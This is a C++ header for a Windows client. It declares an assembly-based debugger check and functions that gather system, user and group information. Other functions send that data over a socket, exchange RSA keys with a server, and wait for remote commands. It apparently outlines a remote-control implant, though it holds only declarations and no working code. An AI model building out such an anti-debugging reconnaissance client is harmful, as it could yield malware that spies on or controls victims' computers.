#ifndef WIN_CLIENT_H
#define WIN_CLIENT_H

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <array>
#include <sstream>
#include <iomanip>
#include <algorithm>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <intrin.h>
#include <bcrypt.h>
#include <userenv.h>
#include <Lmcons.h>
#include <aclapi.h>
#include <lm.h>
#include <lmaccess.h>
#include <lmapibuf.h>
#include <windows.h>
#include <shlobj.h> // For SHGetFolderPath and CSIDL_PROFILE
#include <winternl.h>

#include <locale>
#include <codecvt>

#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/bio.h>
#include <openssl/err.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

/**
 * Call external assembly:
 * PPEB -> pointer to PEB
 * CheckDebugger returns ifDebugger byte
*/
extern "C" {
    PPEB getPEB();
    BYTE CheckDebugger();
}

// Function declarations
void initWinsock();
SOCKET connectSocket(const std::string& host, int port);

std::string getOSInfo();
std::string getProcessorInfo();
std::string getMemoryInfo();
std::string getDiskInfo();
std::string getUserInfo();
std::string getUsersAndGroupsInfo();
std::string getAllSystemInfo();

void sendData(SOCKET sock, const char* buffer, int len);
std::vector<char> receivePublicKey(SOCKET sock);
void savePrivateKey(const std::vector<char>& keyData, const std::string& filePath);
EVP_PKEY* loadPublicKey(const std::vector<char>& pemKey);
void savePrivateKey(const std::vector<char>& keyData, const std::string& filePath);

// Convert a string to a wide string
std::wstring toWide(const std::string& str);
// Convert a wide string to a narrow string
std::string toNarrow(const std::wstring& wstr);
// Convert wstring to LPCSTR
const char* wstringToLPCSTR(const std::wstring& wstr);

// Load a private key from a file
EVP_PKEY* loadPrivateKeyFromFile(const char* filename);

void handleCommand(const std::string& cmd);
void waitForCommands(SOCKET& clientSocket);

#endif // WIN_CLIENT_H
